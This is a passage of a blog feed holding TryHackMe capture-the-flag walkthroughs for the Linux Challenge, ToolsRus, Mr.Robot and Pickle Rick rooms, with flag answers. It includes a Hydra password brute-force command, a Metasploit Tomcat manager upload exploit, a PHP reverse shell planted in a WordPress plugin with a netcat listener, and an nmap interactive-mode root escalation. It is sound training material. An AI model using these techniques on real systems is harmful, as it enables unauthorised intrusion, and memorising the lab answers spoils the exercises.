&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732959767022272603/unknown.png&quot; alt=&quot;flag31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 2fb1cab13bf5f4d61de3555430c917f4&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-3: Flag 31_A&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We will now list all the table with the following Commands:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USE database_2fb1cab13bf5f4d61de3555430c917f4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHOW TABLES;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT * FROM flags;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732961334135881889/unknown.png&quot; alt=&quot;flag32&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; ee5954ee1d4d94d61c2f823d7b9d733c&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-4: Flag 32&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag requires you to Download the .mp3 File via Filezilla and Listen to it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; tryhackme1337&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-5: Flag 33&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The location to storeee your $PATH is &lt;strong&gt;.profile&lt;/strong&gt; in Bob’s Directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732962417415553032/unknown.png&quot; alt=&quot;flag33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 547b6ceee3c5b997b625de99b044f5cf&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-6: Flag 34&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In order to list the enviroment Variables, you will ned to apply the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ printenv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732962987442307172/unknown.png&quot; alt=&quot;flag34&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 7a88306309fe05070a7c5bb26a6b2def&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-7: Flag 35&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We will use the Command &lt;strong&gt;getent group&lt;/strong&gt; for this one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732964717236191366/unknown.png&quot; alt=&quot;flag35&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 769afb6&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-8: Flag 36&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Flag is located in /etc. We need to know who i allowed to read it.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ id&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ cat /etc/flag36&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732967072728088736/unknown.png&quot; alt=&quot;flag36&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 83d233f2ffa388e5f0b053848caed1eb&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com This rooms purpose is to learn or improve your Linux skills. There will be challenges that will involve you using the following commands and techniques: Using commands such as: ls, grep, cd, tail, head, curl, strings, tmux, find, locate, diff, tar, xxd Understanding cronjobs, MOTD's and system mounts SSH'ing to other users accounts using a password and private key Locating files on the system hidden in different directories Encoding methods (base64, hex) MySQL database interaction Using SCP to download a file Understanding Linux system paths and system variables Understanding file permissions Using RDP for a GUI URL: Linux Challenge Difficulty: Very Easy Author: Ben Task 2-1: Garry’s Home Directory The first Task is to SSH into Garry’s System. We already got the SSH Credentials. In this Case the Command would be the following: As we can see, there are a Total of 3 Files in his Home Directory.</summary></entry><entry><title type="html">TryHackMe | ToolsRus CTF</title><link href="http://localhost:4000/ToolsRus/" rel="alternate" type="text/html" title="TryHackMe | ToolsRus CTF" /><published>2020-07-15T00:00:00+02:00</published><updated>2020-07-15T00:00:00+02:00</updated><id>http://localhost:4000/ToolsRus</id><content type="html" xml:base="http://localhost:4000/ToolsRus/">&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Toys_%22R%22_Us_logo.svg/1280px-Toys_%22R%22_Us_logo.svg.png&quot; alt=&quot;toolsrus&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello Guys!&lt;/p&gt;

&lt;p&gt;In this Post I am going to share my ToolsRus CTF experience with you.
Your challenge is to use the tools listed below to enumerate a server, gathering information along 
the way that will eventually lead to you taking over the machine.
This CTF Requires the following Tools:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Dirbuster&lt;/li&gt;
  &lt;li&gt;Hydra&lt;/li&gt;
  &lt;li&gt;Nmap&lt;/li&gt;
  &lt;li&gt;Nikto&lt;/li&gt;
  &lt;li&gt;Metasploit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/toolsrus&quot;&gt;ToolsRus CTF&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulty: Easy&lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/tryhackme&quot;&gt;TryHackMe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First of all we will Enumerate the Machine.&lt;/p&gt;

&lt;p&gt;I started with a Nmap Scan followed by a Gobuster Scan on Port 80 with the famous common.txt Wordlits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733051608207982602/unknown.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733052056235147354/unknown.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once I navigated into the &lt;strong&gt;/guidelines&lt;/strong&gt; Directory, I found a potential Username &lt;strong&gt;Bob&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733055470977286254/unknown.png&quot; alt=&quot;guidelines&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Port 1234 is open. It is running Apache Tomcat/7.0.88.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733056110038089774/unknown.png&quot; alt=&quot;tomcat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here are the Results of Gobsuter on Port 1234:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733056974241005689/unknown.png&quot; alt=&quot;gobuster2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next thing I did was a Bruteforce attack with rockyou on the &lt;strong&gt;/protected&lt;/strong&gt; Direction, since it requires a Password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733058590042226768/unknown.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to crack the Passoword I used Hydra with the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ hydra -l bob -P {YOUR WORDLIST} -f {MACHINE_IP} http-get /protected/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733059086408482846/unknown.png&quot; alt=&quot;hydra&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we got into the Site, we got a Picture saying “This Protected Page has now moved to a different Port”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733059536910417920/unknown.png&quot; alt=&quot;protected&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran Nikto against Port &lt;strong&gt;1234&lt;/strong&gt; afterwards to find our new loginpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733074665584459846/unknown.png&quot; alt=&quot;nikto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to login to the &lt;strong&gt;Tomcat Manager&lt;/strong&gt; on Port 1234 with the same Credentials. It worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733060078973878302/unknown.png&quot; alt=&quot;tomcatmanager&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a Manager we have the ability to Upload a &lt;strong&gt;WAR&lt;/strong&gt; File. You could created a WAR File with a Linux Payload and upload it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733062009540706444/unknown.png&quot; alt=&quot;upload-tomcat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As it turns out, this Tomcat Server is very outdated and vulnerable. I found a Metasploit Module to ecploit the Manager on Port 1234.
The Module is called &lt;strong&gt;exploit/multi/http/tomcat_mgr_upload&lt;/strong&gt;. It spwans a Meterpreter Session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733076590526857317/unknown.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get the Shell as the Root User. The next thing I did was getting the Root Flag, which is stored in &lt;strong&gt;/root/flag.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733077167277211678/unknown.png&quot; alt=&quot;rootflag&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! In this Post I am going to share my ToolsRus CTF experience with you. Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine. This CTF Requires the following Tools: Dirbuster Hydra Nmap Nikto Metasploit</summary></entry><entry><title type="html">TryHackMe | Anonymous CTF</title><link href="http://localhost:4000/Anonymous/" rel="alternate" type="text/html" title="TryHackMe | Anonymous CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Anonymous</id><content type="html" xml:base="http://localhost:4000/Anonymous/">&lt;p&gt;&lt;img src=&quot;http://hdwallpaperfun.com/wp-content/uploads/2014/12/Anonymous-Mask-Space-Wallpaper-Widescreen-45480.jpg&quot; alt=&quot;anonymous&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html"></summary></entry><entry><title type="html">TryHackMe | Mr.Robot CTF</title><link href="http://localhost:4000/Mr.Robot/" rel="alternate" type="text/html" title="TryHackMe | Mr.Robot CTF" /><published>2020-07-14T00:00:00+02:00</published><updated>2020-07-14T00:00:00+02:00</updated><id>http://localhost:4000/Mr.Robot</id><content type="html" xml:base="http://localhost:4000/Mr.Robot/">&lt;p&gt;&lt;img src=&quot;https://www.hdwallpapers.in/walls/mr_robot_hd_4k_8k-HD.jpg&quot; alt=&quot;mr-robot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello Guys!&lt;/p&gt;

&lt;p&gt;Today we will discuss the Mr.Robot CTF on TryHackMe.com
The Room was Simple and Fun. It contained a Wordpress Website, the Goal was to Root the System.&lt;/p&gt;

&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/mrrobot&quot;&gt;Mr Robot CTF&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulty: Easy&lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/ben&quot;&gt;Ben&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The first Step is to Enumerate the System. Below we see the Nmap Scan Results.
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732637299380322304/unknown.png&quot; alt=&quot;nmap-scan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the Port 80 is open and assigned to a Web-Server. As we check out the Website,
we get a Mr.Robot themed Terminal, it appears to be a rabbit Hole.
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732638395393900554/unknown.png&quot; alt=&quot;mrorobotsite&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we got a Website, I ran Gobuster with the “/usr/share/wordlists/dirb/common.txt” wordlist against the
Site. Here were all the Results I got:
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732642289565958225/unknown.png&quot; alt=&quot;gobuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got robots.txt as a Hit. The robots.txt, also known as the Robots Exlucion Standart Protocoll, is a Text-File which specify, which 
Directories can be readed and which not. The so called “Crawlers” from Web Browsers, always search for the 
robots.txt File when calling a Website, that way the Browsers know which Directories they are allowed to Display.&lt;/p&gt;

&lt;p&gt;I got the Directory &lt;strong&gt;key-1-of-3.txt&lt;/strong&gt; in the robots.txt File. In the Directory I found my First Key.
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732640712604254228/unknown.png&quot; alt=&quot;robots.txt&quot; /&gt;
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732640932029136946/unknown.png&quot; alt=&quot;firstkey&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you may also saw, there was a /login Directory displayed on Gobuster. As we navigate to it,
we can see, its a Wordpress Website. 
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732643118310228050/unknown.png&quot; alt=&quot;wordpresslogin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got a txt File from the Room before, it contained the Password. The File had a lot of Words in seperate Lines in it. All I had to do was to
use the Command &lt;strong&gt;uniq&lt;/strong&gt; with the parameter &lt;strong&gt;-u&lt;/strong&gt; to sort out the File. I got 8 Entrys left in the Output, one of them had to be the Password. The Password was
&lt;strong&gt;ER28-0652&lt;/strong&gt;.
As we got no Username, we could either start a Dictionary Attack with common Usernames, start a Bruteforce Attack. As we know, this is a Mr. Robot based 
Room, so I tried Names from Characters. Turns out the Username was Elliot.&lt;/p&gt;

&lt;p&gt;We now successfully gained access to the WordPress Panel. &lt;br /&gt;
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732666213263474889/unknown.png&quot; alt=&quot;wordpresspanel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In there, I enumerated further for more Informations. I found another User called &lt;strong&gt;michi05654&lt;/strong&gt;. Turns out that this User (Subscriber) wasnt relevant.&lt;/p&gt;

&lt;p&gt;Since I got Access to the Plugin Manager, I simply uploaded a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell Script&lt;/a&gt;. 
Now there were two ways, either I uploaded a completley new Plugin or I change a existing one. I setted up a Netcat Listener on Port 4444, edited an existing Plugin and successfully
got a Reverse Shell. 
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732673375519899749/unknown.png&quot; alt=&quot;netcat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we are a so called “Daemon”. A Daemon is  a process that runs in the background and performs a specified operation at predefined times or in response to certain events. 
I imported Python and spawned the Bash Shell with the following Command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732676093378560100/unknown.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Next key was located in &lt;strong&gt;/home/robot&lt;/strong&gt;. It was a MD5 Hash, so I cracked it with Hashcat and the famous rockyou.txt.&lt;/p&gt;

&lt;p&gt;To obtain the 3rd and last Flag, I had to get Root Privilleges. I used the Command &lt;strong&gt;nmap –interactive&lt;/strong&gt; followed by &lt;strong&gt;!sh&lt;/strong&gt; to obtain a Root Shell.
I could easily navigate to /root and get the last Key. 
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732681441464418419/unknown.png&quot; alt=&quot;3rdkey&quot; /&gt;&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we will discuss the Mr.Robot CTF on TryHackMe.com The Room was Simple and Fun. It contained a Wordpress Website, the Goal was to Root the System. URL: Mr Robot CTF Difficulty: Easy Author: Ben</summary></entry><entry><title type="html">TryHackMe | Pickle Rick CTF</title><link href="http://localhost:4000/PickleRick/" rel="alternate" type="text/html" title="TryHackMe | Pickle Rick CTF" /><published>2020-07-13T00:00:00+02:00</published><updated>2020-07-13T00:00:00+02:00</updated><id>http://localhost:4000/PickleRick</id><content type="html" xml:base="http://localhost:4000/PickleRick/">&lt;p&gt;&lt;img src=&quot;https://hdqwalls.com/wallpapers/rick-and-morty-in-another-dimension-illustration-6c.jpg&quot; alt=&quot;Rick-and-Morty&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello Guys!&lt;/p&gt;

&lt;p&gt;Today we are doing the Pickle Rick CTF on TryHackMe.com.
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.&lt;/p&gt;

&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;Pickle-Rick&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulty: Easy&lt;/p&gt;

&lt;p&gt;Author: TryHackMe&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! Today we are doing the Pickle Rick CTF on TryHackMe.com. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. URL: Pickle-Rick Difficulty: Easy Author: TryHackMe</summary></entry></feed>